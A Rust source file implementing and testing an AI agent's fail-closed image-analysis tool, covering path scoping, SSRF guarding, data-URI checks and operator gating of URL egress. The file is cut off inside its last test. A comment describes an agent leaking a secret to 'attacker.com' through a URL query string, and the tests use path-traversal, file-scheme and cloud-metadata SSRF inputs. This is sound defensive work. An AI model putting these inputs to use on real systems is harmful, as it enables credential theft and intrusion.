//! L2-3 `image_analysis` capability tool — vision over Claude, image input fail-closed-validated.
//!
//! Ported from the TS oracle `src/agent/tools/friday-agent-image-analysis-tool.ts`. This is the
//! THIRD L2 capability tool (after web_fetch / web_search). It lets the agent send image(s) +
//! a prompt to a vision model and pulls the analysis text into its context.
//!
//! ## What this module does vs what `friday-vision` does (the split)
//! The [`VisionExecutor`] here is the SECURITY boundary: it ACQUIRES + VALIDATES every image
//! BEFORE any model call, then hands a fully-validated [`friday_vision::VisionRequest`] to an
//! injected [`friday_vision::VisionModelClient`] (the Claude impl in prod, a stub in tests). The
//! model-call shaping (the Anthropic Messages-API image-bearing request) lives in `friday-vision`.
//!
//! ## Image-input validation (SECURITY — no-degrade critical)
//! The TS oracle accepts three image forms; each is validated fail-closed here:
//!   - **workspace path** — opened through `friday_fs::open_read_within_root` (the SAME hardened
//!     workspace-root-contained safe-open the fs tools use): lexical containment + ancestor-symlink
//!     rejection + fd-identity TOCTOU check. So `../../etc/passwd` / an absolute path / a symlink
//!     escape are all rejected. Bytes are read as raw `Vec<u8>` (binary — never lossy-UTF-8).
//!   - **http(s) URL** — fetched through [`crate::http_tools::ssrf_guarded_get_bytes`]: the SAME
//!     fail-closed SSRF posture web_fetch uses (validate_url + resolve-the-host-ourselves +
//!     validate every resolved IP + PIN into the connection; redirects disabled). A private /
//!     metadata / loopback target is refused BEFORE any socket. `file://` is rejected by the SSRF
//!     guard's protocol check.
//!   - **data: URI** — parsed: the media type MUST be an allowed `image/*`, the payload MUST be
//!     base64 that decodes, and the DECODED size MUST be within the per-image cap. The original
//!     base64 is passed through unchanged (no decode-then-re-encode).
//! Plus global bounds: at most [`MAX_IMAGES`] images and at most [`MAX_TOTAL_DECODED_BYTES`]
//! decoded across all images.
//!
//! ## Wiring
//! REGISTERED in [`crate::ToolRegistry::default`] (`mutating:false, Risk::ReadOnly`) but REFUSED
//! by the gate-dispatch chokepoint unless `FRIDAY_VISION_ENABLED` is exactly `"1"` (default-OFF
//! → DARK → flag-OFF byte-identical) AND HIDDEN from the model menu while off. Flipping the flag
//! live is OPERATOR-GATED (a vision provider key + token cost). [`crate::http_tools::CompositeToolExecutor`]
//! routes `image_analysis` here; everything else stays on the inner fs / web executors.

use crate::http_tools::{self, ImageFetchError};
use crate::ssrf_guard::SsrfPolicy;
use crate::{ExecError, ToolExecutor, ToolReceipt};
use base64::Engine as _;
use friday_vision::{
    ClaudeVisionClient, VisionError, VisionImage, VisionModelClient, VisionOutcome, VisionRequest,
    ALLOWED_MEDIA_TYPES,
};
use std::io::Read as _;
use std::path::PathBuf;
use std::time::Duration;

/// Max images per `image_analysis` call (bounds the request + the egress fan-out for URL images).
///
/// SECURITY (flip-precondition, BUG 4 — crash-recovery staleness): an `image_analysis` dispatch is
/// SEQUENTIAL and can be SLOW — each image is up to a 30s fetch ([`IMAGE_FETCH_TIMEOUT_MS`]) plus a
/// vision-model call. The agent loop sets the durable crash-recovery heartbeat ONCE before the
/// whole tool dispatch (it has no hook to refresh it MID-tool — the per-run `work_item_id`/`conn`
/// are not threaded through the `ToolExecutor` trait, and doing so would touch the security-critical
/// dispatch chokepoint = the "large plumbing" we avoid). So the WHOLE multi-image call must finish
/// within [`crate::crash_recovery::EXECUTION_STATE_STALE_THRESHOLD_MS`] (300s) or a concurrent boot
/// crash-recovery PASS-2 could mistake a LIVE run for a crash and false-abort it (a degrade).
///
/// At the former cap of 8, worst case = 8 × (30s fetch + per-call vision timeout) ≫ 300s → the
/// false-abort hole. CAPPED to 2: worst case = 2 × (30s + 60s) = 180s, a 120s margin under 300s.
/// This bound is CONDITIONAL on the friday-anthropic per-request timeout (≈60s, see
/// `ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED`) being added — that wall-clock bound on a SINGLE model
/// call is tracked SEPARATELY (`UreqTransport::post_json` is currently unbounded); without it ONE
/// call is unbounded and blows 300s regardless of the cap. So BUG 4 is PARTIALLY closed here (the
/// fan-out is bounded); the per-call bound is the separate work. The `max_images_staleness_invariant`
/// test pins the fan-out arithmetic.
pub const MAX_IMAGES: usize = 2;

/// Per-image decoded-size cap (10 MiB) — the data-uri base64 cap AND the workspace/URL read cap.
pub const MAX_IMAGE_DECODED_BYTES: usize = 10 * 1024 * 1024;

/// Max total decoded bytes across all images in one call (bounds aggregate memory/egress).
pub const MAX_TOTAL_DECODED_BYTES: usize = 20 * 1024 * 1024;

/// Per-image URL fetch timeout (matches the web_fetch default posture).
const IMAGE_FETCH_TIMEOUT_MS: u64 = 30_000;

/// The ASSUMED wall-clock bound on a SINGLE vision-model call, used ONLY by the
/// `max_images_staleness_invariant` test to verify the worst-case [`MAX_IMAGES`] fan-out stays
/// under the crash-recovery staleness threshold. This is NOT yet enforced in
/// `friday_anthropic::UreqTransport::post_json` (which is currently unbounded) — adding that 60s
/// per-request timeout is SEPARATE work the [`MAX_IMAGES`] cap is conditional on (see its doc). The
/// const documents the assumption the cap math relies on so an adversarial reviewer sees it stated.
/// `#[cfg(test)]`-only: it is a documentation/test anchor, not enforced production state.
#[cfg(test)]
pub(crate) const ANTHROPIC_REQUEST_TIMEOUT_MS_ASSUMED: u64 = 60_000;

/// The valid `detail` values (TS-parity; no-op for Claude — validated, never forwarded).
const VALID_DETAILS: &[&str] = &["low", "high", "auto"];

/// Marker the executor returns when the vision provider key is missing — surfaced as the model-
/// visible warning (an `Ok(ToolReceipt)`, NOT an `Err`), parity with the TS oracle's
/// "no vision model configured" path (the model SEES the warning, never a silent change).
const NO_VISION_PROVIDER_WARNING: &str =
    "image_analysis is unavailable: no vision provider credential is configured \
     (set FRIDAY_ANTHROPIC_API_KEY on the Hub). Refusing to silently skip image analysis.";

/// Executes the `image_analysis` action: validate+acquire images → build a `VisionRequest` →
/// delegate to the injected [`VisionModelClient`]. Holds the workspace `root` (for local-path
/// scoping) + the SSRF policy (for URL images) + the boxed vision client (Claude in prod, stub
/// in tests). Implements [`ToolExecutor`] for ONLY `image_analysis`.
pub struct VisionExecutor {
    root: PathBuf,
    ssrf_policy: SsrfPolicy,
    client: Box<dyn VisionModelClient + Send + Sync>,
}

impl VisionExecutor {
    /// Construct with an explicit (boxed) vision client + the deny-private production SSRF posture.
    /// The live runtime uses [`VisionExecutor::for_runtime`] (which injects the lazy Claude-from-env
    /// client); tests inject the deterministic [`friday_vision::StubVisionClient`] here. A client
    /// that fails closed on a missing key (the runtime client when `FRIDAY_ANTHROPIC_API_KEY` is
    /// absent) surfaces as the fail-closed warning receipt — never a silent skip.
    pub fn new(root: impl Into<PathBuf>, client: Box<dyn VisionModelClient + Send + Sync>) -> Self {
        Self {
            root: root.into(),
            ssrf_policy: SsrfPolicy::default(),
            client,
        }
    }

    /// Production/runtime constructor: the workspace `root` + the deny-private SSRF posture + a
    /// [`RuntimeVisionClient`] that lazily resolves the Claude vision client from
    /// `FRIDAY_ANTHROPIC_API_KEY` per call (fail-closed → the warning receipt when the key is
    /// absent). This is what the live runtime wraps into the [`crate::http_tools::CompositeToolExecutor`];
    /// with `FRIDAY_VISION_ENABLED` OFF the chokepoint refuses `image_analysis` before this is
    /// ever reached, so it is byte-identical when dark.
    pub fn for_runtime(root: impl Into<PathBuf>) -> Self {
        Self {
            root: root.into(),
            ssrf_policy: SsrfPolicy::default(),
            client: Box::new(RuntimeVisionClient),
        }
    }

    /// Construct with an explicit SSRF policy — used by the e2e tests to set
    /// `allow_private_network = true` so a 127.0.0.1 mock image server is reachable; NEVER used
    /// with private-allowed in production.
    pub fn with_policy(
        root: impl Into<PathBuf>,
        ssrf_policy: SsrfPolicy,
        client: Box<dyn VisionModelClient + Send + Sync>,
    ) -> Self {
        Self {
            root: root.into(),
            ssrf_policy,
            client,
        }
    }

    fn param<'a>(params: &'a [(String, String)], key: &str) -> Option<&'a str> {
        params
            .iter()
            .find(|(k, _)| k == key)
            .map(|(_, v)| v.as_str())
    }

    /// The core path: parse params → validate+acquire each image → build the request → delegate.
    fn analyze(&self, params: &[(String, String)]) -> Result<ToolReceipt, ExecError> {
        let prompt = Self::param(params, "prompt")
            .map(str::to_string)
            .filter(|p| !p.trim().is_empty())
            .ok_or_else(|| ExecError::MissingParam("prompt".to_string()))?;

        // images: required. The dev bridge flattens the TS string[] to a single param with one
        // image per line (mirrors web_fetch's flattened `headers`); also accept a single image.
        let images_raw = Self::param(params, "images")
            .ok_or_else(|| ExecError::MissingParam("images".to_string()))?;
        let specs: Vec<&str> = images_raw
            .lines()
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .collect();
        if specs.is_empty() {
            return Err(ExecError::Vision(VisionToolError::NoImages));
        }
        if specs.len() > MAX_IMAGES {
            return Err(ExecError::Vision(VisionToolError::TooManyImages {
                count: specs.len(),
                max: MAX_IMAGES,
            }));
        }

        // detail: TS-parity. Validate against the allowed set when present (an invalid value is a
        // hard param error — never silently dropped); NOT forwarded to Claude (no-op there).
        let detail = match Self::param(params, "detail")
            .map(str::trim)
            .filter(|s| !s.is_empty())
        {
            Some(d) => {
                if !VALID_DETAILS.contains(&d) {
                    return Err(ExecError::Vision(VisionToolError::InvalidDetail(
                        d.to_string(),
                    )));
                }
                Some(d.to_string())
            }
            None => None,
        };

        let model = Self::param(params, "model")
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string);
        let max_tokens =
            Self::param(params, "maxTokens").and_then(|s| s.trim().parse::<u32>().ok());

        // ── Validate + acquire every image, accumulating the total decoded size ──
        let mut images: Vec<VisionImage> = Vec::with_capacity(specs.len());
        let mut total_decoded: usize = 0;
        for spec in specs {
            let (image, decoded_len) = self.acquire_image(spec)?;
            total_decoded = total_decoded.saturating_add(decoded_len);
            if total_decoded > MAX_TOTAL_DECODED_BYTES {
                return Err(ExecError::Vision(VisionToolError::TotalTooLarge {
                    total: total_decoded,
                    max: MAX_TOTAL_DECODED_BYTES,
                }));
            }
            images.push(image);
        }

        let request = VisionRequest {
            prompt,
            images,
            model,
            detail,
            max_tokens,
        };

        // ── Delegate to the injected vision client (fail-closed on a missing provider key) ──
        match self.client.analyze(&request) {
            Ok(outcome) => {
                // model-facing content: the analysis + a compact footer (model + image count +
                // token usage when reported). Mirrors the TS {analysis, model, imageCount, ...}.
                let mut content = outcome.analysis.clone();
                content.push_str(&format!(
                    "\n\n[image_analysis: model={} images={}",
                    outcome.model, outcome.image_count
                ));
                if let (Some(i), Some(o)) = (outcome.input_tokens, outcome.output_tokens) {
                    content.push_str(&format!(" inputTokens={i} outputTokens={o}"));
                }
                content.push(']');
                // summary (REFS-ONLY → the hash-chained audit ledger): model + image count +
                // analysis byte length ONLY. NEVER the analysis text (external/model content),
                // NEVER an image. Mirrors web_fetch keeping the body off the ledger.
                let summary = format!(
                    "image_analysis [{}]: {} image(s), {} byte(s) analysis",
                    outcome.model,
                    outcome.image_count,
                    outcome.analysis.len()
                );
                Ok(ToolReceipt {
                    action: "image_analysis".to_string(),
                    summary,
                    content: Some(content),
                })
            }
            Err(friday_vision::VisionError::CredentialMissing(_)) => {
                // Fail-closed: a result CARRYING the warning (the model SEES it), never a silent
                // skip, never an ExecError that would hide the warning. Parity with web_search's
                // missing-key receipt + the TS "no vision model configured" path.
                Ok(ToolReceipt {
                    action: "image_analysis".to_string(),
                    summary: "image_analysis: refused (no vision provider)".to_string(),
                    content: Some(NO_VISION_PROVIDER_WARNING.to_string()),
                })
            }
            Err(e) => Err(ExecError::Vision(VisionToolError::Provider(e.to_string()))),
        }
    }

    /// Validate + acquire ONE image spec into a [`VisionImage`] + its decoded byte length.
    /// Fail-closed on every form. Returns the per-image decoded length so the caller can bound
    /// the aggregate. The image FORM is classified by the shared [`image_source_kind`] so the
    /// executor's egress decision can never drift from the gate's egress classification.
    fn acquire_image(&self, spec: &str) -> Result<(VisionImage, usize), ExecError> {
        match image_source_kind(spec) {
            ImageSourceKind::DataUri => {
                // strip "data:" — `image_source_kind` already confirmed the prefix.
                self.acquire_data_uri(spec.strip_prefix("data:").unwrap_or(spec))
            }
            // The ONLY form that opens an outbound socket (SSRF-guarded egress).
            ImageSourceKind::Url => self.acquire_url(spec),
            ImageSourceKind::FileScheme => {
                // file:// is NEVER a workspace path nor an http(s) URL — reject explicitly (a local
                // file MUST come in as a workspace-relative path, scoped by open_read_within_root).
                Err(ExecError::Vision(VisionToolError::RejectedScheme(
                    "file".to_string(),
                )))
            }
            // Treat as a workspace-relative path (the SAME scoping the fs read tool uses).
            ImageSourceKind::WorkspacePath => self.acquire_workspace_path(spec),
        }
    }

    /// data: URI → validate media type (allowed image/*) + base64 decodes + decoded size cap.
    /// Passes the ORIGINAL base64 through (no re-encode). Format: `data:<media>;base64,<payload>`.
    fn acquire_data_uri(&self, rest: &str) -> Result<(VisionImage, usize), ExecError> {
        // rest = "<media>;base64,<payload>" (we already stripped "data:").
        let (meta, payload) = rest
            .split_once(',')
            .ok_or(ExecError::Vision(VisionToolError::MalformedDataUri))?;
        // Only base64 data-URIs are supported (a raw/url-encoded data-uri is rejected, not
        // silently mis-decoded).
        let media_type = meta
            .strip_suffix(";base64")
            .ok_or(ExecError::Vision(VisionToolError::MalformedDataUri))?
            .to_lowercase();
        validate_media_type(&media_type)?;
        // Decode ONLY to measure + verify it is valid base64; the original payload is sent as-is.
        let decoded = base64::engine::general_purpose::STANDARD
            .decode(payload.trim())
            .map_err(|_| ExecError::Vision(VisionToolError::BadBase64))?;
        if decoded.is_empty() {
            return Err(ExecError::Vision(VisionToolError::EmptyImage));
        }
        if decoded.len() > MAX_IMAGE_DECODED_BYTES {
            return Err(ExecError::Vision(VisionToolError::ImageTooLarge {
                bytes: decoded.len(),
                max: MAX_IMAGE_DECODED_BYTES,
            }));
        }
        Ok((
            VisionImage {
                media_type,
                base64_data: payload.trim().to_string(),
            },
            decoded.len(),
        ))
    }

    /// http(s) URL → SSRF-guarded bounded binary GET → derive+validate media type → base64-encode.
    fn acquire_url(&self, url: &str) -> Result<(VisionImage, usize), ExecError> {
        let (bytes, content_type) = http_tools::ssrf_guarded_get_bytes(
            url,
            &self.ssrf_policy,
            // Read at most one image's worth; a larger body is caught by the cap check below.
            MAX_IMAGE_DECODED_BYTES + 1,
            Duration::from_millis(IMAGE_FETCH_TIMEOUT_MS),
        )
        .map_err(|e| ExecError::Vision(VisionToolError::ImageFetch(e)))?;
        if bytes.is_empty() {
            return Err(ExecError::Vision(VisionToolError::EmptyImage));
        }
        if bytes.len() > MAX_IMAGE_DECODED_BYTES {
            return Err(ExecError::Vision(VisionToolError::ImageTooLarge {
                bytes: bytes.len(),
                max: MAX_IMAGE_DECODED_BYTES,
            }));
        }
        // Media type from the response Content-Type; fall back to sniffing the magic bytes (a
        // server that mislabels content-type still gets the right block IFF the bytes are a known
        // image). MUST resolve to an allowed image/* — else fail-closed.
        let media_type = if ALLOWED_MEDIA_TYPES.contains(&content_type.as_str()) {
            content_type
        } else {
            sniff_image_media_type(&bytes)
                .ok_or(ExecError::Vision(VisionToolError::UnsupportedMediaType(
                    content_type,
                )))?
                .to_string()
        };
        let len = bytes.len();
        Ok((
            VisionImage {
                media_type,
                base64_data: friday_vision::encode_image_base64(&bytes),
            },
            len,
        ))
    }

    /// workspace path → hardened safe-open (containment + symlink + TOCTOU) → bounded binary read
    /// → derive+validate media type (extension, then magic-byte sniff) → base64-encode.
    fn acquire_workspace_path(&self, path: &str) -> Result<(VisionImage, usize), ExecError> {
        let file = friday_fs::open_read_within_root(&self.root, path).map_err(ExecError::Fs)?;
        // BINARY bounded read (raw Vec<u8>, never lossy-UTF-8): read at most the cap + 1 so an
        // over-cap file is detected without reading unbounded bytes.
        let mut bytes: Vec<u8> = Vec::new();
        file.take((MAX_IMAGE_DECODED_BYTES + 1) as u64)
            .read_to_end(&mut bytes)
            .map_err(ExecError::Io)?;
        if bytes.is_empty() {
            return Err(ExecError::Vision(VisionToolError::EmptyImage));
        }
        if bytes.len() > MAX_IMAGE_DECODED_BYTES {
            return Err(ExecError::Vision(VisionToolError::ImageTooLarge {
                bytes: bytes.len(),
                max: MAX_IMAGE_DECODED_BYTES,
            }));
        }
        // Media type from the file extension, then a magic-byte sniff as a fallback/cross-check.
        let media_type = media_type_from_extension(path)
            .filter(|m| ALLOWED_MEDIA_TYPES.contains(m))
            .map(str::to_string)
            .or_else(|| sniff_image_media_type(&bytes).map(str::to_string))
            .ok_or_else(|| ExecError::Vision(VisionToolError::UnsupportedMediaType(path.into())))?;
        let len = bytes.len();
        Ok((
            VisionImage {
                media_type,
                base64_data: friday_vision::encode_image_base64(&bytes),
            },
            len,
        ))
    }
}

impl ToolExecutor for VisionExecutor {
    fn execute(&self, action: &str, params: &[(String, String)]) -> Result<ToolReceipt, ExecError> {
        match action {
            "image_analysis" => self.analyze(params),
            other => Err(ExecError::Unsupported(other.to_string())),
        }
    }
}

/// Why an `image_analysis` failed at the tool level (distinct from a missing-provider key, which
/// is a normal `ToolReceipt` carrying the fail-closed warning so the model sees it). An image
/// validation/acquisition refusal, or a hard provider failure.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum VisionToolError {
    /// No images after parsing the `images` param.
    NoImages,
    /// More than [`MAX_IMAGES`] images requested.
    TooManyImages { count: usize, max: usize },
    /// One image's decoded size exceeds [`MAX_IMAGE_DECODED_BYTES`].
    ImageTooLarge { bytes: usize, max: usize },
    /// The aggregate decoded size exceeds [`MAX_TOTAL_DECODED_BYTES`].
    TotalTooLarge { total: usize, max: usize },
    /// A data-uri that did not parse as `data:<media>;base64,<payload>`.
    MalformedDataUri,
    /// A data-uri payload that was not valid base64.
    BadBase64,
    /// An image whose media type is not an allowed `image/*`.
    UnsupportedMediaType(String),
    /// An empty image (zero bytes).
    EmptyImage,
    /// An explicitly rejected scheme (e.g. `file://`).
    RejectedScheme(String),
    /// An invalid `detail` value (not low/high/auto).
    InvalidDetail(String),
    /// A URL image fetch failed (SSRF refusal or transport).
    ImageFetch(ImageFetchError),
    /// A hard provider failure from the vision client (auth/transport/bad-response). Kind only.
    Provider(String),
}

impl std::fmt::Display for VisionToolError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            VisionToolError::NoImages => write!(f, "image_analysis_no_images"),
            VisionToolError::TooManyImages { count, max } => {
                write!(f, "image_analysis_too_many_images:{count}>{max}")
            }
            VisionToolError::ImageTooLarge { bytes, max } => {
                write!(f, "image_analysis_image_too_large:{bytes}>{max}")
            }
            VisionToolError::TotalTooLarge { total, max } => {
                write!(f, "image_analysis_total_too_large:{total}>{max}")
            }
            VisionToolError::MalformedDataUri => write!(f, "image_analysis_malformed_data_uri"),
            VisionToolError::BadBase64 => write!(f, "image_analysis_bad_base64"),
            VisionToolError::UnsupportedMediaType(m) => {
                write!(f, "image_analysis_unsupported_media_type:{m}")
            }
            VisionToolError::EmptyImage => write!(f, "image_analysis_empty_image"),
            VisionToolError::RejectedScheme(s) => write!(f, "image_analysis_rejected_scheme:{s}"),
            VisionToolError::InvalidDetail(d) => write!(f, "image_analysis_invalid_detail:{d}"),
            VisionToolError::ImageFetch(e) => write!(f, "image_analysis_image_fetch:{e}"),
            VisionToolError::Provider(k) => write!(f, "image_analysis_provider:{k}"),
        }
    }
}

/// The runtime's [`VisionModelClient`]: per call it lazily constructs a [`ClaudeVisionClient`]
/// from the Hub environment (`FRIDAY_ANTHROPIC_API_KEY`) and delegates. A MISSING/empty key
/// surfaces as [`VisionError::CredentialMissing`] (→ the executor's fail-closed warning receipt,
/// so the model sees it) — NEVER a silent fallback to a different provider. Constructing per call
/// (rather than once at runtime boot) means the operator can provision the key without a restart,
/// and an unkeyed Hub stays cleanly dark. The vision tool is itself flag-gated OFF by default, so
/// this is reached only when `FRIDAY_VISION_ENABLED=1`.
struct RuntimeVisionClient;

impl VisionModelClient for RuntimeVisionClient {
    fn analyze(&self, request: &VisionRequest) -> Result<VisionOutcome, VisionError> {
        ClaudeVisionClient::from_env()?.analyze(request)
    }
}

// ─── helpers ───

/// The FORM of one image spec — the SINGLE source of truth for "what does this image do?", used
/// by BOTH the executor ([`VisionExecutor::acquire_image`]) AND the gate classifier
/// ([`image_analysis_has_url_image`] → `ToolRegistry::classify`). Sharing one classifier is what
/// makes the egress classification and the executor's actual egress provably non-divergent (the
/// `classify_matches_executor_*` correspondence tests pin it). Detection order matches
/// `acquire_image`: `data:` FIRST (so a `data:` URI is never mis-read as a URL even if its payload
/// contains the `http` substring), then the `http(s)://` SCHEME (a prefix check, NOT a `contains`),
/// then `file://`, else a workspace-relative path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum ImageSourceKind {
    /// `data:<media>;base64,<payload>` — inline bytes, NO egress.
    DataUri,
    /// `http://` / `https://` — the ONLY form that opens an outbound socket (SSRF-guarded).
    Url,
    /// `file://` — explicitly rejected (fail-closed), NO egress.
    FileScheme,
    /// Anything else — a workspace-relative path opened in-root, NO egress.
    WorkspacePath,
}

/// Classify ONE image spec into its [`ImageSourceKind`]. MUST stay byte-identical to the branch
/// order in [`VisionExecutor::acquire_image`].
pub(crate) fn image_source_kind(spec: &str) -> ImageSourceKind {
    if spec.starts_with("data:") {
        ImageSourceKind::DataUri
    } else if spec.starts_with("http://") || spec.starts_with("https://") {
        ImageSourceKind::Url
    } else if spec.starts_with("file://") {
        ImageSourceKind::FileScheme
    } else {
        ImageSourceKind::WorkspacePath
    }
}

/// SECURITY (flip-precondition, BUG 2): does THIS `image_analysis` call include ANY http(s) URL
/// image? `image_analysis` is registered `mutating:false` (a read), but a URL image triggers a GET
/// to the agent-supplied URL BEFORE validation — `https://attacker.com/log?token=<secret>` leaks
/// via the query string before the image even validates. The registry-level classifier
/// (`ToolRegistry::classify`) RAISES `mutating` to true for any call with a URL image so it enters
/// the gate (the operator approves the egress); a call with ONLY local forms (`data:` / workspace
/// path / `file://`) stays `mutating:false` (no socket — no-degrade for the common in-workspace
/// case). Parses the `images` param EXACTLY as [`VisionExecutor::analyze`] does (split on lines,
/// trim, drop empties) and uses the SHARED [`image_source_kind`] so the egress predicate and the
/// executor's egress can never diverge. Inspects the (model-controlled) param STRINGS only; the
/// boolean is trusted Hub-derived, never model-asserted — the seal holds.
pub(crate) fn image_analysis_has_url_image(params: &[(String, String)]) -> bool {
    let Some(images_raw) = params
        .iter()
        .find(|(k, _)| k == "images")
        .map(|(_, v)| v.as_str())
    else {
        return false;
    };
    images_raw
        .lines()
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .any(|spec| image_source_kind(spec) == ImageSourceKind::Url)
}

/// Validate that `media_type` is one of the allowed `image/*` types (fail-closed otherwise).
fn validate_media_type(media_type: &str) -> Result<(), ExecError> {
    if ALLOWED_MEDIA_TYPES.contains(&media_type) {
        Ok(())
    } else {
        Err(ExecError::Vision(VisionToolError::UnsupportedMediaType(
            media_type.to_string(),
        )))
    }
}

/// Map a file extension to an allowed image media type (lowercased). `None` for unknown.
fn media_type_from_extension(path: &str) -> Option<&'static str> {
    let ext = path.rsplit('.').next()?.to_lowercase();
    match ext.as_str() {
        "jpg" | "jpeg" => Some("image/jpeg"),
        "png" => Some("image/png"),
        "gif" => Some("image/gif"),
        "webp" => Some("image/webp"),
        _ => None,
    }
}

/// Sniff a known image media type from leading magic bytes (a defensive cross-check when the
/// extension / Content-Type is missing or mislabeled). `None` if the bytes are not a known image.
fn sniff_image_media_type(bytes: &[u8]) -> Option<&'static str> {
    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
        Some("image/jpeg")
    } else if bytes.starts_with(b"\x89PNG\r\n\x1a\n") {
        Some("image/png")
    } else if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        Some("image/gif")
    } else if bytes.len() >= 12 && &bytes[0..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
        Some("image/webp")
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use friday_vision::StubVisionClient;

    fn stub_executor(root: impl Into<PathBuf>) -> VisionExecutor {
        VisionExecutor::new(root, Box::new(StubVisionClient::default()))
    }

    /// A tiny valid 1x1 PNG (magic bytes + minimal payload) base64-encoded — enough to pass the
    /// magic-byte sniff. Not a real renderable image; the model client is a stub here.
    fn png_bytes() -> Vec<u8> {
        // 8-byte PNG signature + a few bytes; sniff only checks the signature.
        let mut v = vec![0x89, b'P', b'N', b'G', b'\r', b'\n', 0x1a, b'\n'];
        v.extend_from_slice(b"rest-of-fake-png-payload");
        v
    }

    #[test]
    fn data_uri_png_validates_and_delegates() {
        let dir = std::env::temp_dir().join(format!("vis-data-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let exec = stub_executor(&dir);
        let b64 = base64::engine::general_purpose::STANDARD.encode(png_bytes());
        let spec = format!("data:image/png;base64,{b64}");
        let receipt = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "describe".into()),
                    ("images".into(), spec),
                ],
            )
            .unwrap();
        let content = receipt.content.unwrap();
        assert!(content.contains("STUB-VISION"), "content: {content}");
        assert!(content.contains("images=1"));
        assert!(receipt.summary.contains("image_analysis"));
    }

    #[test]
    fn data_uri_rejects_non_image_media_type() {
        let exec = stub_executor(std::env::temp_dir());
        let b64 = base64::engine::general_purpose::STANDARD.encode(b"hello");
        let spec = format!("data:text/plain;base64,{b64}");
        let err = exec
            .execute(
                "image_analysis",
                &[("prompt".into(), "x".into()), ("images".into(), spec)],
            )
            .unwrap_err();
        assert!(
            matches!(
                err,
                ExecError::Vision(VisionToolError::UnsupportedMediaType(_))
            ),
            "got {err:?}"
        );
    }

    #[test]
    fn data_uri_rejects_bad_base64() {
        let exec = stub_executor(std::env::temp_dir());
        let err = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    (
                        "images".into(),
                        "data:image/png;base64,!!!not base64!!!".into(),
                    ),
                ],
            )
            .unwrap_err();
        assert!(matches!(err, ExecError::Vision(VisionToolError::BadBase64)));
    }

    #[test]
    fn data_uri_enforces_per_image_size_cap() {
        let exec = stub_executor(std::env::temp_dir());
        // Decoded size > MAX_IMAGE_DECODED_BYTES.
        let big = vec![0u8; MAX_IMAGE_DECODED_BYTES + 1];
        let b64 = base64::engine::general_purpose::STANDARD.encode(&big);
        let spec = format!("data:image/png;base64,{b64}");
        let err = exec
            .execute(
                "image_analysis",
                &[("prompt".into(), "x".into()), ("images".into(), spec)],
            )
            .unwrap_err();
        assert!(matches!(
            err,
            ExecError::Vision(VisionToolError::ImageTooLarge { .. })
        ));
    }

    #[test]
    fn workspace_path_is_scoped_and_traversal_is_rejected() {
        let dir = std::env::temp_dir().join(format!("vis-ws-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("pic.png"), png_bytes()).unwrap();
        let exec = stub_executor(&dir);

        // In-root path: accepted + delegated.
        let ok = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "describe".into()),
                    ("images".into(), "pic.png".into()),
                ],
            )
            .unwrap();
        assert!(ok.content.unwrap().contains("STUB-VISION"));

        // Traversal: rejected by the hardened safe-open (ExecError::Fs), never read.
        let err = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    ("images".into(), "../../etc/passwd".into()),
                ],
            )
            .unwrap_err();
        assert!(
            matches!(err, ExecError::Fs(_)),
            "traversal must be rejected by the workspace-scoped open, got {err:?}"
        );
    }

    #[test]
    fn file_scheme_is_rejected() {
        let exec = stub_executor(std::env::temp_dir());
        let err = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    ("images".into(), "file:///etc/passwd".into()),
                ],
            )
            .unwrap_err();
        assert!(matches!(
            err,
            ExecError::Vision(VisionToolError::RejectedScheme(_))
        ));
    }

    #[test]
    fn url_image_under_production_policy_blocks_private_ssrf() {
        // PRODUCTION SSRF policy (deny-private): a private/metadata target is refused BEFORE any
        // socket — proving the URL-image path runs the SSRF guard fail-closed.
        let exec = stub_executor(std::env::temp_dir());
        let err = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    (
                        "images".into(),
                        "http://169.254.169.254/latest/meta-data/img.png".into(),
                    ),
                ],
            )
            .unwrap_err();
        assert!(
            matches!(
                err,
                ExecError::Vision(VisionToolError::ImageFetch(ImageFetchError::Ssrf(_)))
            ),
            "private URL image must be SSRF-blocked, got {err:?}"
        );
    }

    #[test]
    fn missing_prompt_and_missing_images_are_missing_params() {
        let exec = stub_executor(std::env::temp_dir());
        let e1 = exec
            .execute("image_analysis", &[("images".into(), "x".into())])
            .unwrap_err();
        assert!(matches!(e1, ExecError::MissingParam(p) if p == "prompt"));
        let e2 = exec
            .execute("image_analysis", &[("prompt".into(), "p".into())])
            .unwrap_err();
        assert!(matches!(e2, ExecError::MissingParam(p) if p == "images"));
    }

    #[test]
    fn too_many_images_is_rejected() {
        let exec = stub_executor(std::env::temp_dir());
        let b64 = base64::engine::general_purpose::STANDARD.encode(png_bytes());
        let one = format!("data:image/png;base64,{b64}");
        let many = std::iter::repeat(one.as_str())
            .take(MAX_IMAGES + 1)
            .collect::<Vec<_>>()
            .join("\n");
        let err = exec
            .execute(
                "image_analysis",
                &[("prompt".into(), "x".into()), ("images".into(), many)],
            )
            .unwrap_err();
        assert!(matches!(
            err,
            ExecError::Vision(VisionToolError::TooManyImages { .. })
        ));
    }

    #[test]
    fn invalid_detail_is_rejected() {
        let dir = std::env::temp_dir().join(format!("vis-det-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("pic.png"), png_bytes()).unwrap();
        let exec = stub_executor(&dir);
        let err = exec
            .execute(
                "image_analysis",
                &[
                    ("prompt".into(), "x".into()),
                    ("images".into(), "pic.png".into()),
                    ("detail".into(), "ultra".into()),
                ],
